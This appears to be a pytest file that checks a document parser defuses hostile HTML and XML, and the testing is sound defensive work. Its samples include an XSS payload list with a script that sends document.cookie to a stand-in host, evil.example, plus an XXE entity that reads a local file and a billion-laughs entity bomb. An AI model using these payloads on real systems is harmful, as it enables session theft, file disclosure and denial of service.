"""Tests P6.6 — HTML/XML hostile : scripts, XXE, entités, malformé."""

from __future__ import annotations

import shutil
import tempfile
from pathlib import Path
from xml.etree import ElementTree as ET

import pytest

from core.knowledge import formats as F
from core.knowledge.parsers import ParseError


def _tmp():
    tmp = Path(tempfile.mkdtemp(prefix="p66h_"))
    return tmp


def _clean(tmp):
    shutil.rmtree(tmp, ignore_errors=True)


PAYLOADS = [
    "<script>fetch('https://evil.example/x?' + document.cookie)</script>",
    "<img src=x onerror='steal(document.domain)'>",
    "<iframe src='https://evil.example'></iframe>",
    "<object data='https://evil.example/x.swf'></object>",
    "<svg><animate onbegin='evil()' />",
    "<a href='javascript:evil()'>clique</a>",
    "<div onclick='e()' onload='e()' onmouseover='e()'>texte</div>",
]


def test_hostile_markup_inert_no_network():
    tmp = _tmp()
    try:
        html = tmp / "evil.html"
        html.write_text(
            "<html><head><title>T</title></head><body><p>Texte sain.</p>"
            + "".join(PAYLOADS) + "<p>Fin saine.</p></body></html>",
            encoding="utf-8")
        res = F.parse_html(html)
        assert res["status"] == "PARSED"
        for needle in ("fetch(", "onerror", "evil()", "javascript:",
                       "document.cookie"):
            assert needle not in res["text"]
        assert "Texte sain." in res["text"] and "Fin saine." in res["text"]
    finally:
        _clean(tmp)


def test_xxe_external_entity_not_resolved():
    # Entité externe vers un fichier canari : ne doit JAMAIS être lue.
    tmp = _tmp()
    try:
        canary = tmp / "canary.txt"
        canary.write_text("CANARY-XXE-LEAK-PROBE", encoding="utf-8")
        from core.knowledge import formats as P

        evil = tmp / "xxe.docx"
        import zipfile

        doc = ("<?xml version='1.0'?>\n<!DOCTYPE r ["
               f"<!ENTITY xxe SYSTEM 'file://{canary}'>]>\n"
               '<w:document xmlns:w="http://schemas.openxmlformats.org/'
               'wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&xxe;'
               "</w:t></w:r></w:p></w:body></w:document>")
        ct = ("<?xml version='1.0'?><Types xmlns='http://schemas.openxmlformats"
              ".org/package/2006/content-types'/>")
        with zipfile.ZipFile(str(evil), "w") as zf:
            zf.writestr("[Content_Types].xml", ct.encode())
            zf.writestr("word/document.xml", doc.encode())
        try:
            res = P.parse_docx(evil)
            assert "CANARY-XXE-LEAK-PROBE" not in res.get("text", "")
        except ParseError:
            pass  # refus fail-closed également acceptable
    finally:
        _clean(tmp)


def test_billion_laughs_bounded():
    # Expansion exponentielle modeste : doit terminer vite ou refuser proprement.
    import time

    bomb = ("<?xml version='1.0'?>\n<!DOCTYPE r ["
            "<!ENTITY a0 'xxxxx'>"
            "<!ENTITY a1 '&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;'>"
            "<!ENTITY a2 '&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;'>"
            "<!ENTITY a3 '&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;'>"
            "]>\n<w:document xmlns:w='http://schemas.openxmlformats.org/"
            "wordprocessingml/2006/main'><w:body><w:p><w:r><w:t>&a3;"
            "</w:t></w:r></w:p></w:body></w:document>")
    tmp = _tmp()
    try:
        import zipfile

        path = tmp / "lol.docx"
        ct = ("<?xml version='1.0'?><Types xmlns='http://schemas.openxmlformats"
              ".org/package/2006/content-types'/>")
        with zipfile.ZipFile(str(path), "w") as zf:
            zf.writestr("[Content_Types].xml", ct.encode())
            zf.writestr("word/document.xml", bomb.encode())
        start = time.monotonic()
        from core.knowledge import formats as P

        try:
            res = P.parse_docx(path)
            elapsed = time.monotonic() - start
            assert elapsed < 20, "expansion trop lente"
            assert len(res.get("text", "")) < 10 * 1024 * 1024
        except (ParseError, MemoryError):
            pass  # refus fail-closed acceptable
    finally:
        _clean(tmp)


def test_malformed_xml_fail_closed():
    tmp = _tmp()
    try:
        import zipfile

        for name, body in (
                ("unclosed.docx",
                 b"<?xml version='1.0'?><w:document><w:body><w:p>oubli"),
                ("notxml.docx", b"\x00\x01\x02 binary \xff\xfe")):
            path = tmp / name
            ct = ("<?xml version='1.0'?><Types xmlns='http://schemas.openxmlformats"
                  ".org/package/2006/content-types'/>")
            with zipfile.ZipFile(str(path), "w") as zf:
                zf.writestr("[Content_Types].xml", ct.encode())
                zf.writestr("word/document.xml", body)
            from core.knowledge import formats as P

            with pytest.raises(ParseError):
                P.parse_docx(path)
    finally:
        _clean(tmp)
